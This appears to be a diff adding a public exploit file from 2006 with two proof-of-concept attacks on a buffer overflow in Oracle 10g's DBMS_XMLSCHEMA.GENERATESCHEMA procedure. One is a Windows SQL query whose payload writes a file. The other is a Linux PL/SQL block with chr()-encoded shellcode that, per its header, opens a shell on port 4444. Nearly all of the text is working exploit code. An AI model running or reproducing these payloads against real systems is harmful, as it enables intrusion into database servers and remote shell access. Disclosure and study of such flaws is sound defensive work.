@@ -1,0 +1,87 @@
+/*
+   Argeniss - Information Security
+   http://www.argeniss.com
+   info>at<argeniss>dot<com
+
+   Advisory: http://www.argeniss.com/research/ARGENISS-ADV-010601.txt
+
+   Proof of concept exploit code Oracle Database Buffer overflow vulnerability in public procedure DBMS_XMLSCHEMA.GENERATESCHEMA
+   http://www.argeniss.com/research.html
+
+   By Esteban Martinez Fayo (esteban>at<argeniss>dot<com)
+
+   Oracle version: 10g Release 1
+   Platform: Windows
+
+   Shellcode creates file c:\Unbreakable.txt and writes "ARE YOU SURE?"
+*/
+
+
+
+SELECT XDB.DBMS_XMLSCHEMA.GENERATESCHEMA ('a', 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBCCCCCCCCCCABCDE' || chr(212)||chr(100)||chr(201)||chr(01)||chr(141)||chr(68)||chr(36)||chr(18)||chr(80)||chr(255)||chr(21)||chr(192)||chr(146)||chr(49)||chr(02)||chr(255)||chr(21)||chr(156)||chr(217)||chr(49)||chr(2)||chr(32)||'echo ARE YOU SURE? >c:\Unbreakable.txt') FROM DUAL;
+
+
+
+
+
+
+
+
+/*
+   Argeniss - Information Security
+   http://www.argeniss.com
+   info>at<argeniss>dot<com
+
+   Advisory: http://www.argeniss.com/research/ARGENISS-ADV-010601.txt
+
+   Proof of concept exploit code Oracle Database Buffer overflow vulnerability in public procedure DBMS_XMLSCHEMA.GENERATESCHEMA
+   http://www.argeniss.com/research.html
+
+   By Ariel Matias Sanchez (dymitri>at<argeniss>dot<com)
+
+   Oracle version: 10g Release 1
+   Platform: Linux
+
+   Shellcode opens a shell on port 4444 from www.metasploit.com.
+*/
+
+
+DECLARE a SYS.XMLTYPE; -- return value
+AAA VARCHAR2(32767);
+AA VARCHAR2(32767);
+BBB VARCHAR2(32767);
+JMP VARCHAR2(32767);
+RET VARCHAR2(32767);
+RETT VARCHAR2(32767);
+SHELLCODE VARCHAR2(32767);
+BEGIN
+AAA:='A';
+AAA:=AAA || AAA; 
+AAA:=AAA || AAA; 
+AAA:=AAA || AAA; 
+AAA:=AAA || AAA; 
+AAA:=AAA || AAA;
+AAA:=AAA || AAA;
+JMP := 'BB' ||chr(235) || chr(09);
+RETT:= chr(138) || chr(153) || chr(255) ||chr(191); 
+RET:= chr(219) || chr(176) || chr(10) ||chr(08); 
+SHELLCODE :=chr(41)||chr(201)||chr(219)||chr(201)||chr(177)||chr(22)||chr(184)||chr(37)
+||chr(84)||chr(39)||chr(117)||chr(217)||chr(116)||chr(36)||chr(244)||chr(95)
+||chr(131)||chr(199)||chr(4)||chr(49)||chr(71)||chr(17)||chr(3)||chr(98)
+||chr(69)||chr(197)||chr(128)||chr(93)||chr(190)||chr(90)||chr(40)||chr(206)
+||chr(42)||chr(95)||chr(196)||chr(150)||chr(242)||chr(198)||chr(145)||chr(183)
+||chr(206)||chr(121)||chr(55)||chr(116)||chr(131)||chr(31)||chr(80)||chr(107)
+||chr(127)||chr(134)||chr(243)||chr(2)||chr(158)||chr(44)||chr(146)||chr(76)
+||chr(49)||chr(224)||chr(12)||chr(229)||chr(80)||chr(207)||chr(49)||chr(69)
+||chr(244)||chr(1)||chr(210)||chr(104)||chr(121)||chr(243)||chr(71)||chr(36)
+||chr(57)||chr(125)||chr(134)||chr(120)||chr(219)||chr(176)||chr(201)||chr(235)
+||chr(78)||chr(73)||chr(147)||chr(187)||chr(176)||chr(128)||chr(163)||chr(242)
+||chr(183)||chr(227)||chr(20)||chr(15)||chr(26)||chr(124)||chr(122)||chr(32)
+||chr(233)||chr(20)||chr(236)||chr(17)||chr(111)||chr(140)||chr(130)||chr(228)
+||chr(140)||chr(28)||chr(8)||chr(127)||chr(179)||chr(108)||chr(46);
+BBB:= JMP || RET ||'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'||SHELLCODE||'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB';
+AA := AAA || BBB;
+a := XDB.DBMS_XMLSCHEMA_INT.GENERATESCHEMA (SCHEMANAME => AA, TYPENAME => 'longstring', ELEMENTNAME => '', RECURSE => FALSE, ANNOTATE => FALSE, EMBEDCOLL => FALSE);
+END;
+
+// milw0rm.com [2006-01-26]
